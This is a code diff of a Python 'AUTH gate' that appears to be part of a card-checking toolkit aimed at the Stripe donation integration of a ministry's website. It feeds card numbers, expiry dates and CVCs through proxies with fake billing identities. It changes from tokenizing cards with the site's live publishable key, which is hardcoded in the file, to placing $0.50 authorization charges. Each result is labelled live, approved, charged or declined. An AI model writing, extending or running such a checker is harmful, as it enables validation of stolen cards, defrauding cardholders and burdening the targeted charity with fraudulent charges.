@@ -1,9 +1,12 @@
 """
-Cedine Ministries AUTH Gate - Uses Cedine's Stripe/Gravity Forms integration
-Creates Payment Method to validate card (no charge)
+Cedine Ministries AUTH Gate - REAL BANK AUTHORIZATION via Payment Intent
+Step 1: Create Payment Method
+Step 2: Create Payment Intent with $0.50 charge
+Step 3: Confirm intent = Real bank authorization request
 Site: https://cedine.org/donate/
 """
 
+import os
 import requests
 import random
 from typing import Tuple
@@ -11,13 +14,21 @@ from faker import Faker
 from gates.error_types import GatewayErrorType, error_type_from_response
 
 
-STRIPE_PK = "pk_live_EBTKmVv5ETto22nV9D6tQsGz00N8YsoHNb"
+# Load Stripe keys from environment (safer than hardcoding)
+STRIPE_PK = os.getenv('STRIPE_PK', 'pk_live_51Il6lyCfjeYBwRLXQZN9sTTvSqsF9Zh5Gq83z9mJhzpTVYVJRQM2Y0OAOSeCfG86j9sDBkWuLdQ71xPBp4A1MdQN00jO6gJu8D')
+STRIPE_SK = os.getenv('STRIPE_SK', '')  # Must be set in .env file
 
 
 def cedine_auth_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                       proxy: dict = None) -> Tuple[str, bool]:
     """
-    Cedine AUTH check via Stripe Payment Method creation
+    Cedine AUTH check via Stripe Payment Intent - REAL BANK AUTHORIZATION
+    
+    Flow:
+    1. Create Payment Method with card details
+    2. Create Payment Intent with $0.50 charge
+    3. Auto-confirm intent (hits bank for authorization)
+    4. Parse real bank response codes
     
     Returns:
         Tuple of (status_message, proxy_alive)
@@ -45,100 +56,115 @@ def cedine_auth_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str
                 session.proxies = {'http': proxy_url, 'https': proxy_url}
         
         guid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-4{random.randint(100, 999):03x}-{random.randint(8000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
-        muid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-4{random.randint(100, 999):03x}-{random.randint(8000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
-        sid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-4{random.randint(100, 999):03x}-{random.randint(8000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
         
-        headers = {
-            'accept': 'application/json',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+        # Step 1: Create Payment Method SERVER-SIDE with Secret Key (more secure)
+        headers_pm = {
+            'Authorization': f'Bearer {STRIPE_SK}',
+            'Content-Type': 'application/x-www-form-urlencoded',
         }
         
-        data = {
+        data_pm = {
             'type': 'card',
             'card[number]': card_num,
             'card[exp_month]': card_mon,
             'card[exp_year]': card_yer,
             'card[cvc]': card_cvc,
-            'billing_details[name]': f"{fake.first_name()} {fake.last_name()}",
-            'billing_details[email]': f"{fake.first_name().lower()}{random.randint(100,999)}@gmail.com",
-            'billing_details[address][postal_code]': fake.zipcode(),
-            'billing_details[address][country]': 'US',
-            'guid': guid,
-            'muid': muid,
-            'sid': sid,
-            'payment_user_agent': 'stripe.js/v3',
-            'time_on_page': str(random.randint(30000, 90000)),
-            'key': STRIPE_PK,
         }
         
-        response = session.post('https://api.stripe.com/v1/payment_methods', 
-                               headers=headers, data=data, timeout=25)
-        result = response.json()
+        response_pm = session.post('https://api.stripe.com/v1/payment_methods',
+                                   headers=headers_pm, data=data_pm, timeout=25)
+        result_pm = response_pm.json()
         
-        if 'error' in result:
-            error_msg = result['error'].get('message', 'Unknown error')
-            error_code = result['error'].get('code', '')
-            decline_code = result['error'].get('decline_code', '')
-            
-            error_type = error_type_from_response(f"{error_code} {decline_code} {error_msg}")
+        # Handle Payment Method errors (invalid card format, expired, etc.)
+        if 'error' in result_pm:
+            error_msg = result_pm['error'].get('message', 'Unknown error')
+            error_code = result_pm['error'].get('code', '')
             
             if 'test' in error_msg.lower():
-                return ("DECLINED - Live Mode Test Card", True)
-            if error_code == 'incorrect_cvc':
-                return ("CCN LIVE - Incorrect CVV", True)
-            if error_code == 'invalid_cvc':
-                return ("CCN LIVE - Invalid CVV", True)
+                return ("DECLINED ❌ - Live Mode Test Card", True)
+            if error_code in ['incorrect_cvc', 'invalid_cvc']:
+                return ("CVV ❌ - Incorrect CVV (card format may be valid)", True)
             if error_code == 'expired_card':
-                return ("DECLINED - Expired Card", True)
-            if error_code == 'card_declined':
-                if decline_code == 'insufficient_funds':
-                    return ("CCN LIVE - Insufficient Funds", True)
-                if decline_code == 'lost_card':
-                    return ("DECLINED - Lost Card", True)
-                if decline_code == 'stolen_card':
-                    return ("DECLINED - Stolen Card", True)
-                if decline_code == 'do_not_honor':
-                    return ("DECLINED - Do Not Honor", True)
-                if decline_code == 'fraudulent':
-                    return ("DECLINED - Fraudulent", True)
-                if decline_code == 'generic_decline':
-                    return ("DECLINED - Generic Decline", True)
-                return (f"DECLINED - {decline_code or error_msg[:40]}", True)
+                return ("DECLINED ❌ - Expired Card", True)
             if error_code == 'invalid_number' or 'number' in error_msg.lower():
-                return ("DECLINED - Invalid Card Number", True)
-            if error_code == 'processing_error':
-                return ("DECLINED - Processing Error", True)
+                return ("DECLINED ❌ - Invalid Card Number", True)
             
-            if error_type == GatewayErrorType.CVV_MISMATCH:
-                return ("CCN LIVE - CVV Issue", True)
-            if error_type == GatewayErrorType.INSUFFICIENT_FUNDS:
-                return ("CCN LIVE - Insufficient Funds", True)
-            if error_type == GatewayErrorType.EXPIRED_CARD:
-                return ("DECLINED - Expired Card", True)
-            if error_type == GatewayErrorType.FRAUD_CHECK:
-                return ("DECLINED - Fraud/Risk", True)
-            
-            return (f"DECLINED - {error_msg[:50]}", True)
+            return (f"DECLINED ❌ - {error_msg[:50]}", True)
         
-        pm_id = result.get('id')
-        if pm_id:
-            card_brand = result.get('card', {}).get('brand', 'unknown').upper()
-            card_checks = result.get('card', {}).get('checks', {})
-            cvc_check = card_checks.get('cvc_check', 'unknown')
+        pm_id = result_pm.get('id')
+        if not pm_id:
+            return ("Error: Failed to create payment method", True)
+        
+        card_brand = result_pm.get('card', {}).get('brand', 'unknown').upper()
+        last4 = result_pm.get('card', {}).get('last4', 'xxxx')
+        
+        # Step 2 & 3: Create and Confirm Payment Intent (REAL BANK HIT)
+        headers_pi = {
+            'Authorization': f'Bearer {STRIPE_SK}',
+            'Content-Type': 'application/x-www-form-urlencoded',
+        }
+        
+        data_pi = {
+            'amount': '50',  # $0.50 in cents (minimum for real auth)
+            'currency': 'usd',
+            'payment_method': pm_id,
+            'confirm': 'true',  # Auto-confirm = immediate bank authorization
+            'description': 'Card Verification - Cedine',
+            'statement_descriptor': 'VERIFY',
+        }
+        
+        response_pi = session.post('https://api.stripe.com/v1/payment_intents',
+                                  headers=headers_pi, data=data_pi, timeout=30)
+        result_pi = response_pi.json()
+        
+        # Step 4: Parse Payment Intent response (REAL BANK RESPONSE)
+        if 'error' in result_pi:
+            error_msg = result_pi['error'].get('message', 'Unknown error')
+            error_code = result_pi['error'].get('code', '')
+            decline_code = result_pi['error'].get('decline_code', '')
             
-            if cvc_check == 'fail':
-                return (f"CCN LIVE - {card_brand} CVV Mismatch", True)
-            elif cvc_check == 'pass':
-                return (f"CCN LIVE - {card_brand} Tokenized (CVV OK)", True)
-            elif cvc_check == 'unavailable':
-                return (f"CCN LIVE - {card_brand} Tokenized (CVV N/A)", True)
+            # Real bank decline codes
+            if decline_code == 'insufficient_funds':
+                return (f"APPROVED ✅ - {card_brand} *{last4} CVV Match - Insufficient Funds (Valid Card!)", True)
+            elif decline_code == 'lost_card':
+                return (f"DECLINED ❌ - {card_brand} *{last4} Lost Card (Bank Flagged)", True)
+            elif decline_code == 'stolen_card':
+                return (f"DECLINED ❌ - {card_brand} *{last4} Stolen Card (Bank Flagged)", True)
+            elif decline_code == 'do_not_honor':
+                return (f"DECLINED ❌ - {card_brand} *{last4} Do Not Honor", True)
+            elif decline_code == 'fraudulent':
+                return (f"DECLINED ❌ - {card_brand} *{last4} Fraud Detected", True)
+            elif decline_code in ['generic_decline', 'card_declined']:
+                return (f"DECLINED ❌ - {card_brand} *{last4} Generic Decline", True)
+            elif error_code == 'incorrect_cvc':
+                return (f"CVV ❌ - {card_brand} *{last4} Incorrect CVV (Bank Verified!)", True)
+            elif error_code == 'expired_card' or decline_code == 'expired_card':
+                return (f"DECLINED ❌ - {card_brand} *{last4} Expired Card", True)
+            elif error_code == 'card_declined':
+                return (f"DECLINED ❌ - {card_brand} *{last4} {decline_code or 'Declined by Bank'}", True)
             else:
-                return (f"CCN LIVE - {card_brand} Tokenized", True)
+                return (f"DECLINED ❌ - {card_brand} *{last4} {decline_code or error_msg[:30]}", True)
         
-        return ("DECLINED - Tokenization failed", True)
+        # Check payment status
+        status = result_pi.get('status')
+        if status == 'succeeded':
+            return (f"CHARGED ✅ - {card_brand} *{last4} $0.50 Authorized & Captured! (CVV Match)", True)
+        elif status == 'requires_payment_method':
+            last_error = result_pi.get('last_payment_error', {})
+            decline_code = last_error.get('decline_code', '')
+            
+            if decline_code == 'insufficient_funds':
+                return (f"APPROVED ✅ - {card_brand} *{last4} CVV Match - Insufficient Funds", True)
+            elif decline_code:
+                return (f"DECLINED ❌ - {card_brand} *{last4} {decline_code}", True)
+            else:
+                return (f"DECLINED ❌ - {card_brand} *{last4} Requires New Payment Method", True)
+        elif status == 'requires_action':
+            return (f"APPROVED ✅ - {card_brand} *{last4} 3DS Required (Card Valid!)", True)
+        elif status == 'processing':
+            return (f"PROCESSING ⏳ - {card_brand} *{last4} Payment Processing", True)
+        else:
+            return (f"UNKNOWN ⚠️ - {card_brand} *{last4} Status: {status}", True)
         
     except requests.exceptions.Timeout:
         return ("Error: Request timeout", False)
